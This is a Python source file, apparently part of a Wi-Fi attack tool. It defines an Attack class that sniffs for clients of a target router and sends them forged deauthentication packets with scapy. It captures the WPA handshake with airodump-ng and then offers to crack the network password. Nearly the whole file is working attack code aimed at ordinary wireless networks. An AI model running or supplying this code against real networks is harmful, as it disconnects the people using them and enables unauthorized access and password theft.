from scapy.all import *
import colors
import time
import os
from threading import Timer
import subprocess
from multiprocessing import Process
from glob import glob
from check_handshake import checkHandshake
import signal
from cracker import Cracker
import shutil
from report_builder import ReportBuilder
from termios import tcflush, TCIOFLUSH
import sys



class Attack(object):
	"""docstring for Attack"""
	def __init__(self, targetRouterMac,channel,engine):
		self.ENGINE = engine # main class for exiting the program
		self.clients = []
		self.interface = "wlan0mon"
		self.targetRouterMac = targetRouterMac
		self.channel = channel
		self.dir = os.getcwd()
		self.hasHandshake = False
		self.hs = Process(target=self.capture_handshake)
		self.hs.start()

		# starting handshake verifier
		self.verifier = RepeatTimer(1,self.verify_Handshake)
		self.verifier.daemon = True
		self.verifier.start()



	def start(self):
		t = AsyncSniffer(prn=self.find_clients, iface=self.interface)
		# signal.signal(signal.SIGINT, self.keyboardInterruptHandler)
		t.start()
		self.search_client()
		# self.convert_cap_hccap()
		# if the above loop ended, then close everything
		self.hs.terminate() #terminate hash capture
		self.hs.join()
		self.verifier.cancel() # cancel handshake verifier
		t.stop() # stop the deauther

		if(self.hasHandshake):
			self.call_cracker()
		# self.ENGINE.exit()


	def search_client(self):
		try:
			print(colors.O + "[+]" + colors.W + " Searching for clients...")
			timeout = time.time() + 60*2

			while self.hasHandshake == False and time.time() < timeout:
				time.sleep(8)
				if( len(self.clients) != 0 ):
					print(colors.O + "[-]" + colors.W +" Total clients: "+colors.GR+ str(len(self.clients)) + colors.W)
					self.deauth_clients()
					
			if(self.hasHandshake):
				print()
				print(colors.BOLD+colors.O + "[+]" + colors.P +colors.BOLD+" Captured handshake successfully!" + colors.W)
				
			else:
				print()
				print(colors.R + "[-]" + colors.W + " Timeout")
				print()
				time.sleep(1)
				print(colors.O + "[!]" + colors.W + " No devices are connected to the router!")
				time.sleep(1)
				print()
				r = ReportBuilder(self.targetRouterMac,'',self.clients,self.ENGINE)
				r.reportBuilder()
				self.ENGINE.exit()
		except KeyboardInterrupt:
			pass



	def deauth_clients(self):
	
		if(len(self.clients) != 0):
			print("")
			client = colors.BOLD+colors.GR + str(self.clients).upper() + colors.W
			print(colors.GR + colors.BOLD+ "[+]" + colors.W + " Sending Deauth packet to: "+colors.O+ str(self.clients) + colors.W)
			for i in self.clients:
				self.deauth(i)
				time.sleep(0.2)
	

	def deauth(self,client):
		packet = RadioTap() / \
         Dot11(type=0,         # Management type
               subtype=12,     # Deauthentication subtype
               addr1=client,
               addr2=self.targetRouterMac,
               addr3=self.targetRouterMac) / \
         Dot11Deauth(reason=7) 
         # sending the deauth packet
		sendp(packet, iface=self.interface,count=5,verbose=False)
		
	

	def find_clients(self,p):
		if p.haslayer(Dot11):
			if p.addr1 and p.addr2:                  # if "from" and "to" mac addr. exists
				p.addr1 = p.addr1.lower()   # router mac         # convert both macs to all lower case     
				p.addr2 = p.addr2.lower()   # client mac      
				if self.targetRouterMac.lower() == p.addr1.lower(): # AP's mac address = packt destination mac !
					if p.type in [1, 2]:             # the type I'm looking for
						if p.addr2 not in self.clients and p.addr2 != '':
							self.clients.append(p.addr2)
		

	def capture_handshake(self):
		try:
			cmd = ["airodump-ng", "-w", os.path.join(self.dir,'capture'), '--output-format', 'pcap', '--write-interval', '1', '--bssid', self.targetRouterMac, '--channel',str(self.channel) ,"wlan0mon"]
			handshake = subprocess.call(cmd,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
		except OSError:
			pass
		

	def verify_Handshake(self):
		file = glob("capture*.cap")[0]
		if(os.path.exists(file)):
			v = checkHandshake(os.path.join(self.dir,file))
			self.hasHandshake = v.verify()
			if(self.hasHandshake):
				self.verifier.cancel()
				



	def call_cracker(self):
		print(colors.O + "[-]" + colors.W + " Saving your handshake ")
		file = glob("capture*.cap")[0]
		shutil.copyfile(file,f"{self.targetRouterMac}.cap")

		val = ''
		try:
			tcflush(sys.stdin, TCIOFLUSH)

			val = input(colors.O+"[?] " + colors.W +"Do you want to crack the passwords? (Y/N): ")
		except:
			pass

		if val.lower() == 'y':
			print(colors.B + "[+]" + colors.W + " Trying to crack the passwords.")
			time.sleep(1)
			print(colors.O + "[-]" + colors.W + " Starting the cracker")
			time.sleep(3)
			x = Cracker(self.targetRouterMac,self.clients,self.ENGINE)
			x.crack()

		else:
			# calling final report builder
			r = ReportBuilder(self.targetRouterMac,'',self.clients,self.ENGINE)
			r.reportBuilder()
			self.ENGINE.exit()
		

	def countdown(self,t):
		print('')
		while t:
			mins, secs = divmod(t, 60)
			timer = '{:02d}:{:02d}'.format(mins, secs)
			# print(colors.O + "[+]" +colors.W + " Searching for networks: ", end=' ')
			print(colors.GR + timer, end="\r")
			time.sleep(1)
			t -= 1


class RepeatTimer(Timer):
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)